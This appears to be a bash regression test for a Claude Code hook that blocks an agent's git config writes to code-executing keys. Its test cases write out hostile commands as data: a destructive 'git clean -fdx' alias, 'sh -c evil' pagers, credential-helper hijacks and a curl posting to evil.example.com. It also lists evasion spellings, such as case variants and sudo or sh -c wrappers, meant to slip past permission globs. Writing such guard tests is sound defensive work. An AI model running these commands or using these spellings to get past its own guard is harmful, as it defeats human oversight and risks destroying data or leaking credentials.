#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

source "$SCRIPT_DIR/helpers.sh"

# Regression corpus for egress-guard's `git config` gate, driven by synthetic PreToolUse
# payloads on stdin — no live tool call, no real config written anywhere.
#
# What it guards. `git config alias.z '!git clean -fdx'` is an ordinary config write and
# the destruction happens later, in `git z`, where no rule has a verb to match. Two glob
# denies cover the common spelling at the permission layer. They cannot cover the rest,
# and each gap below is a verdict asserted here rather than a claim in a comment:
#
#   * git's section and variable names are case-insensitive, permission globs are not, so
#     `git config Alias.z …` walks past both globs. `alias` alone has 32 case spellings.
#   * core.pager, core.editor, core.hooksPath, sequence.editor, credential.helper and
#     diff.external each name a program git runs later and were covered only in the
#     one-shot `git -c key=value` form.
#   * `git config --edit` opens an editor on the config and names no key at all.
#
# What it must NOT do, which is the larger half of the file. A read is ordinary work and
# an ordinary key is most of what `git config` is for: a false positive here breaks
# /quick-commit and every normal setup step, and the workaround for a false positive is
# identical to the workaround for a true positive, so a noisy gate teaches evasion.
#
# Every expectation is paired with a MUTATION CONTROL at the bottom: the same corpus is
# replayed against a deliberately broken copy of the guard, and the suite fails unless
# the verdict flips. An assertion that passes against a guard with its key table emptied
# is not testing the guard.
echo "[test_git_guard] egress-guard's git config gate: code-executing keys, and the reads and ordinary keys it must leave alone"
echo ""

WORK="$(new_tmp)" || exit 1
if [ -z "${WORK:-}" ] || [ ! -d "$WORK" ]; then
  echo "  FAIL: could not create a temp dir (mktemp -d returned '${WORK:-}')"
  exit 1
fi
trap 'rm -rf "$WORK"' EXIT

SETTINGS="$REPO_ROOT/.claude/settings.json"
GUARD_SRC="$REPO_ROOT/.claude/hooks/egress-guard.awk"

assert_file_exists "$SETTINGS" ".claude/settings.json exists"
assert_file_exists "$GUARD_SRC" ".claude/hooks/egress-guard.awk exists"
if [ ! -f "$SETTINGS" ] || [ ! -f "$GUARD_SRC" ]; then
  print_summary
fi

# ── the registered hook command, not a hand-written invocation ──────────────
# Read out of settings.json so the suite exercises what Claude Code actually runs. A
# guard that works when called directly and is wired up wrong is the dangerous state.
GUARD="$(python3 - "$SETTINGS" <<'PY'
import json, sys
hooks = (json.load(open(sys.argv[1])).get("hooks") or {}).get("PreToolUse") or []
for entry in hooks:
    matcher = entry.get("matcher") or ""
    if matcher and "Bash" not in matcher:
        continue
    for h in entry.get("hooks", []):
        if "egress-guard" in (h.get("command") or ""):
            print(h["command"])
            raise SystemExit
PY
)"
TOTAL=$((TOTAL + 1))
if [ -n "$GUARD" ]; then
  echo "  PASS: settings.json wires egress-guard into PreToolUse for Bash"
  PASS=$((PASS + 1))
else
  echo "  FAIL: no PreToolUse Bash hook in settings.json runs egress-guard"
  FAIL=$((FAIL + 1))
  print_summary
fi

# ── fixtures ────────────────────────────────────────────────────────────────
# One project per guard variant. The hook resolves its script under
# CLAUDE_PROJECT_DIR, so pointing that at a fixture with a mutated copy of
# egress-guard.awk is all a mutation control needs.
mkfixture() { # mkfixture <dir> <tier>
  mkdir -p "$1/.claude"
  cp -R "$REPO_ROOT/.claude/hooks" "$1/.claude/hooks"
  cp "$SETTINGS" "$1/.claude/settings.json"
  python3 - "$REPO_ROOT/.claude/security.json" "$1/.claude/security.json" "$2" <<'PY'
import json, sys
src, dst, tier = sys.argv[1:4]
try:
    d = json.load(open(src))
except Exception:
    d = {}
d["tier"] = tier
json.dump(d, open(dst, "w"), indent=2)
PY
}
mkfixture "$WORK/proj" relaxed

# ask_in <project-dir> <tier> <command> -> DENY | ASK | PASS | ERROR:<rc>
ask_in() {
  local payload out rc norm
  payload="$(python3 -c '
import json, sys
print(json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Bash",
                  "tool_input": {"command": sys.argv[1]}}))' "$3")"
  set +e
  out="$( (cd "$1" && printf '%s' "$payload" \
    | CLAUDE_PROJECT_DIR="$1" KIT_FIREWALL_TIER="$2" \
      KIT_FIREWALL_HEADLESS="${KIT_TEST_HEADLESS:-0}" sh -c "$GUARD") 2>&1 )"
  rc=$?
  set -e
  norm="$(printf '%s' "$out" | tr -d ' \n')"
  if [ "$rc" -eq 2 ]; then echo DENY; return; fi
  if [ "$rc" -ne 0 ]; then echo "ERROR:$rc"; return; fi
  case "$norm" in
    *'"permissionDecision":"deny"'*) echo DENY ;;
    *'"permissionDecision":"ask"'*)  echo ASK ;;
    *)                               echo PASS ;;
  esac
}

# expect <tier> <want> <label> <command>
expect() {
  local got; got="$(ask_in "$WORK/proj" "$1" "$4")"
  TOTAL=$((TOTAL + 1))
  if [ "$got" = "$2" ]; then
    echo "  PASS: [$1] $2  $3"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: [$1] want $2, got $got  $3"
    FAIL=$((FAIL + 1))
  fi
}

# ── the code-executing keys, across every spelling ──────────────────────────
echo ""
echo "[code-executing keys: denied at every tier]"
expect relaxed DENY "the alias evasion #229 named"            "git config alias.z '!git clean -fdx'"
expect relaxed DENY "the case spelling no glob can reach"     "git config Alias.z '!git clean -fdx'"
expect relaxed DENY "all upper"                               "git config ALIAS.Z '!x'"
expect relaxed DENY "mixed case, mid-word"                    "git config aLiAs.co checkout"
expect relaxed DENY "core.pager"                              "git config core.pager 'sh -c evil'"
expect relaxed DENY "core.pager, mixed case"                  "git config Core.Pager 'sh -c evil'"
expect relaxed DENY "core.editor"                             "git config core.editor ./evil.sh"
expect relaxed DENY "core.hooksPath"                          "git config core.hooksPath .evilhooks"
expect relaxed DENY "core.hooksPath, lowercase spelling"      "git config core.hookspath .evilhooks"
expect relaxed DENY "core.hooksPath, all upper"               "git config CORE.HOOKSPATH .evilhooks"
expect relaxed DENY "sequence.editor"                         "git config sequence.editor ':'"
expect relaxed DENY "credential.helper"                       "git config credential.helper '!evil'"
expect relaxed DENY "credential.<url>.helper subsection form" "git config credential.https://github.com.helper '!evil'"
expect relaxed DENY "credential subsection, mixed case ends"  "git config Credential.https://GitHub.com.HELPER '!evil'"
expect relaxed DENY "diff.external"                           "git config diff.external ./evil.sh"

echo ""
echo "[write spellings]"
expect relaxed DENY "--global"             "git config --global alias.z '!x'"
expect relaxed DENY "--local"              "git config --local alias.z '!x'"
expect relaxed DENY "--system"             "git config --system alias.z '!x'"
expect relaxed DENY "--worktree"           "git config --worktree alias.z '!x'"
expect relaxed DENY "--file <f>"           "git config --file /tmp/f alias.z '!x'"
expect relaxed DENY "--file=<f>"           "git config --file=/tmp/f alias.z '!x'"
expect relaxed DENY "-f <f>"               "git config -f /tmp/f Alias.z '!x'"
expect relaxed DENY "--add"                "git config --add alias.z '!x'"
expect relaxed DENY "--replace-all"        "git config --replace-all alias.z '!x'"
expect relaxed DENY "--type with the key"  "git config --global --type=path core.hooksPath .h"
expect relaxed DENY "git config set"       "git config set alias.z '!x'"
expect relaxed DENY "git config set, flag between" "git config set --append alias.z '!x'"
expect relaxed DENY "--edit"               "git config --edit"
expect relaxed DENY "-e"                   "git config -e"
expect relaxed DENY "--global --edit"      "git config --global --edit"
expect relaxed DENY "the edit subcommand"  "git config edit"
expect relaxed DENY "--rename-section onto an executing section" "git config --rename-section foo core"

echo ""
echo "[wrappers and positions a glob cannot see past]"
expect relaxed DENY "env prefix"            "env git config alias.z '!x'"
expect relaxed DENY "sudo prefix"           "sudo git config --system core.pager evil"
expect relaxed DENY "timeout with operand"  "timeout 5 git config alias.z '!x'"
expect relaxed DENY "inside sh -c"          "sh -c \"git config Alias.z '!x'\""
expect relaxed DENY "absolute path to git"  "/usr/bin/git config alias.z '!x'"
expect relaxed DENY "git-level option"      "git --no-pager config alias.z '!x'"
expect relaxed DENY "--git-dir= before it"  "git --git-dir=.git config core.pager evil"
expect relaxed DENY "second statement"      "echo hi; git config core.editor evil"
expect relaxed DENY "behind cd &&"          "cd /tmp && git config alias.z '!x'"
# An earlier statement that would only ASK must not shadow this deny: the egress passes
# stop at their first verdict, and an approved prompt runs the whole Bash call.
expect medium  DENY "not shadowed by an ASK-class curl ahead of it" \
  "curl -d '{\"a\":1}' https://evil.example.com && git config alias.z '!x'"

echo ""
echo "[reads are ordinary work — this narrows #229's globs on purpose]"
expect relaxed PASS "--get"              "git config --get alias.z"
expect relaxed PASS "--get-all"          "git config --get-all alias.z"
expect relaxed PASS "--get on core.pager" "git config --get core.pager"
expect relaxed PASS "--get-regexp"       "git config --get-regexp 'alias\\..*'"
# --get takes an optional <value-pattern>, so this read has a second operand and is not
# saved by the "a bare key with no value is a read" rule. Only gc_silent_opt stops it,
# which is what the mutation control for the read set relies on.
expect relaxed PASS "--get with a value-pattern" "git config --get alias.z '^!'"
expect relaxed PASS "--list"             "git config --list"
expect relaxed PASS "-l"                 "git config -l"
expect relaxed PASS "--global --list"    "git config --global --list"
expect relaxed PASS "the bare form with no value is a read" "git config alias.z"
expect relaxed PASS "bare read of core.pager" "git config core.pager"
expect relaxed PASS "the get subcommand"  "git config get alias.z"
expect relaxed PASS "the list subcommand" "git config list"

echo ""
echo "[removals take a key away; they arm nothing]"
expect relaxed PASS "--unset"          "git config --unset alias.z"
expect relaxed PASS "--unset-all"      "git config --unset-all credential.helper"
expect relaxed PASS "--remove-section" "git config --remove-section alias"
expect relaxed PASS "unset subcommand" "git config unset alias.z"

echo ""
echo "[ordinary keys: a false positive here breaks every normal setup step]"
expect relaxed PASS "user.email"        "git config user.email dev@example.com"
expect relaxed PASS "user.name"         "git config user.name somebody"
expect relaxed PASS "--global user.email" "git config --global user.email dev@example.com"
expect relaxed PASS "core.autocrlf"     "git config core.autocrlf input"
expect relaxed PASS "remote.origin.url" "git config remote.origin.url https://example.com/x"
expect relaxed PASS "push.default"      "git config push.default simple"
expect relaxed PASS "init.defaultBranch" "git config init.defaultBranch main"
expect relaxed PASS "commit.gpgsign"    "git config commit.gpgsign false"
expect relaxed PASS "--add safe.directory" "git config --add safe.directory /repo"
expect relaxed PASS "branch.<n>.remote"  "git config branch.main.remote origin"
expect relaxed PASS "--rename-section onto an ordinary section" "git config --rename-section foo bar"

echo ""
echo "[prose: naming the command is not running it]"
expect relaxed PASS "in a commit message" "git commit -m \"git config alias.z '!x' is the evasion\""
expect relaxed PASS "in an echo"          "echo \"git config core.pager evil\""
expect relaxed PASS "in a --grep pattern" "git log --grep=\"git config core.hooksPath\""
expect relaxed PASS "in a printf"         "printf '%s\\n' 'git config alias.z x'"
# A dangerous key in operand position under a DIFFERENT git subcommand. This is the case
# the subcommand anchor exists for, and the mutation control for that anchor uses it.
expect relaxed PASS "a key as a git grep pattern" "git grep core.hooksPath docs/"
expect relaxed PASS "a key as a git log pattern"  "git log -S alias.z -- src/"
expect relaxed PASS "in a heredoc body"   "cat <<'EOF'
git config alias.z '!x'
EOF"

echo ""
echo "[tiers: the deny does not ladder, and holds headless]"
expect off     PASS "Off disables the hook, like every other gate" "git config core.hooksPath .h"
expect relaxed DENY "Relaxed"                                      "git config core.hooksPath .h"
expect medium  DENY "Medium"                                       "git config core.hooksPath .h"
expect high    DENY "High"                                         "git config core.hooksPath .h"
KIT_TEST_HEADLESS=1 expect relaxed DENY "headless: a deny is not an ask, so it cannot go quiet" \
  "git config core.hooksPath .h"
KIT_TEST_HEADLESS=1 expect high    DENY "headless at High"         "git config alias.z '!x'"

# ── the MCP surface ────────────────────────────────────────────────────────
# context-mode ships in .mcp.json and ctx_execute runs outside the Bash tool AND outside
# the OS sandbox, so the hook is the only pattern layer in front of it.
echo ""
echo "[MCP: context-mode's executor]"
MCP_OUT="$( (cd "$WORK/proj" && python3 -c '
import json
print(json.dumps({"hook_event_name": "PreToolUse",
                  "tool_name": "mcp__context-mode__ctx_execute",
                  "tool_input": {"code": "git config alias.z \x27!git clean -fdx\x27",
                                 "language": "shell"}}))' \
  | CLAUDE_PROJECT_DIR="$WORK/proj" KIT_FIREWALL_TIER=relaxed KIT_FIREWALL_HEADLESS=0 \
    sh -c "$GUARD") 2>&1 || true )"
assert_contains "$MCP_OUT" '"permissionDecision":"deny"' "an MCP shell payload is gated too"
assert_contains "$MCP_OUT" "mcp__context-mode__ctx_execute" "the denial names the MCP tool, not a shell command"

# ── mutation controls ──────────────────────────────────────────────────────
# Every expectation above is only worth what a broken guard would cost it. Each control
# below breaks the guard in one specific way and asserts the matching verdict FLIPS. A
# control that does not flip means the assertion it protects was passing for some other
# reason.
echo ""
echo "[mutation controls: the assertions above must fail against a broken guard]"

# new_mut <label> -> a fresh fixture with its own pristine copy of the guard.
#
# The label, not a counter: these helpers run inside command substitution, so a counter
# incremented here never reaches the caller and every mutation would land in one fixture
# and COMPOUND. That is not a hypothetical — it happened while writing this suite, and
# the controls went green over a guard whose key table had been emptied several
# mutations ago. rm -rf first, because `cp -R src dst` with dst present copies *into* it
# on BSD and leaves the previous mutation in place.
new_mut() {
  local dir="$WORK/mut-$(printf '%s' "$1" | tr -c 'A-Za-z0-9._-' '_')"
  [ -n "${WORK:-}" ] && [ -d "$WORK" ] || { echo "  FAIL: no temp dir for a mutation fixture" >&2; exit 1; }
  rm -rf "$dir"
  mkfixture "$dir" relaxed
  printf '%s' "$dir"
}

# mutate <find> <replace> -> fixture dir
# Operates on CODE, never on a header comment: the find string must occur exactly once
# outside a comment line, or the mutation aborts. An earlier draft of this suite replaced
# the first textual occurrence and silently edited the file's own documentation, so six
# controls reported a guard that had never been broken.
mutate() {
  local dir; dir="$(new_mut "mutate-$1")"
  python3 - "$dir/.claude/hooks/egress-guard.awk" "$1" "$2" <<'PY'
import sys
path, find, repl = sys.argv[1:4]
lines = open(path, encoding="utf-8").read().split("\n")
hits = [i for i, l in enumerate(lines) if find in l and not l.lstrip().startswith("#")]
if len(hits) != 1:
    sys.exit("mutation target %r matched %d non-comment lines, wanted 1" % (find, len(hits)))
lines[hits[0]] = lines[hits[0]].replace(find, repl)
open(path, "w", encoding="utf-8").write("\n".join(lines))
PY
  printf '%s' "$dir"
}

# drop_key <key> -> fixture dir with that key removed from the guard's own key table.
# The key list is read back out of the guard rather than restated here, so the controls
# cover whatever set actually ships and a key added later gets one for free.
drop_key() {
  local dir; dir="$(new_mut "drop-$1")"
  python3 - "$dir/.claude/hooks/egress-guard.awk" "$1" <<'PY'
import re, sys
path, drop = sys.argv[1:3]
text = open(path, encoding="utf-8").read()
m = re.search(r'^(\s*GC_EXEC = ")([^"]*)(")\s*$', text, re.M)
if not m:
    sys.exit("no GC_EXEC assignment found in %s" % path)
keys = m.group(2).split()
if drop not in keys:
    sys.exit("key %r is not in GC_EXEC (%s)" % (drop, " ".join(keys)))
kept = " ".join(k for k in keys if k != drop)
open(path, "w", encoding="utf-8").write(
    text[:m.start()] + m.group(1) + kept + m.group(3) + text[m.end():])
PY
  printf '%s' "$dir"
}

# add_key <key> -> fixture dir with an ORDINARY key wrongly added to the table.
add_key() {
  local dir; dir="$(new_mut "add-$1")"
  python3 - "$dir/.claude/hooks/egress-guard.awk" "$1" <<'PY'
import re, sys
path, add = sys.argv[1:3]
text = open(path, encoding="utf-8").read()
m = re.search(r'^(\s*GC_EXEC = ")([^"]*)(")\s*$', text, re.M)
if not m:
    sys.exit("no GC_EXEC assignment found in %s" % path)
open(path, "w", encoding="utf-8").write(
    text[:m.start()] + m.group(1) + add + " " + m.group(2) + m.group(3) + text[m.end():])
PY
  printf '%s' "$dir"
}

# flips <label> <fixture> <command> <shipped-verdict> <mutated-verdict>
flips() {
  local got; got="$(ask_in "$2" relaxed "$3")"
  TOTAL=$((TOTAL + 1))
  if [ "$got" = "$5" ]; then
    echo "  PASS: planted failure caught — $1 (shipped $4, broken guard $got)"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: planted failure NOT caught — $1: broken guard still says $got, wanted $5"
    echo "        ($3)"
    FAIL=$((FAIL + 1))
  fi
}

# 1. The case fold removed: the whole reason this is a hook rather than a glob.
M="$(mutate 'k = tolower(unmark(key))' 'k = unmark(key)')"
flips "case fold dropped, so Alias.z walks past" "$M" "git config Alias.z '!x'" DENY PASS
flips "...while the lowercase spelling still fires, so only the fold broke" \
  "$M" "git config alias.z '!x'" DENY DENY

# 2. Each code-executing key, removed from the table one at a time. The list comes from
#    the guard, so there is no second copy of it here to drift.
GC_KEYS="$(sed -n 's/^[[:space:]]*GC_EXEC = "\(.*\)"[[:space:]]*$/\1/p' "$GUARD_SRC")"
TOTAL=$((TOTAL + 1))
if [ -n "$GC_KEYS" ]; then
  echo "  PASS: read the guard's own key table: $GC_KEYS"
  PASS=$((PASS + 1))
else
  echo "  FAIL: no GC_EXEC key table found in $GUARD_SRC, so no key control can be built"
  FAIL=$((FAIL + 1))
fi
for key in $GC_KEYS; do
  case "$key" in
    'alias.*') probe="git config alias.z '!x'" ;;
    *)         probe="git config $key evil" ;;
  esac
  M="$(drop_key "$key")"
  flips "$key removed from the key table" "$M" "$probe" DENY PASS
done

# 3. A read wrongly gated: the narrowing this PR makes is load-bearing too, so breaking
#    it has to be caught. The probe carries a <value-pattern>, so the "a bare key with no
#    value is a read" rule cannot stand in for the read set and mask the break.
M="$(mutate 'o == "--get" ||' 'o == "--get-NOT-A-REAL-FLAG" ||')"
flips "--get dropped from the read set, so an ordinary read is gated" \
  "$M" "git config --get alias.z '^!'" PASS DENY

# 4. An ordinary key wrongly gated: user.email added to the table must break the
#    /quick-commit path, and the suite has to notice.
M="$(add_key user.email)"
flips "user.email added to the key table, so a normal setup step is gated" \
  "$M" "git config user.email dev@example.com" PASS DENY

# 5. Subcommand anchoring removed: the guard would fire on a key that is merely an
#    argument to some other git subcommand. This is the false-positive class that teaches
#    evasion, so it gets a control of its own.
M="$(mutate 'if (i > n || T[i] != "config") return ""' 'if (i > n) return ""')"
flips "subcommand anchor removed, so a git grep for the key fires the gate" \
  "$M" "git grep core.hooksPath docs/" PASS DENY

print_summary
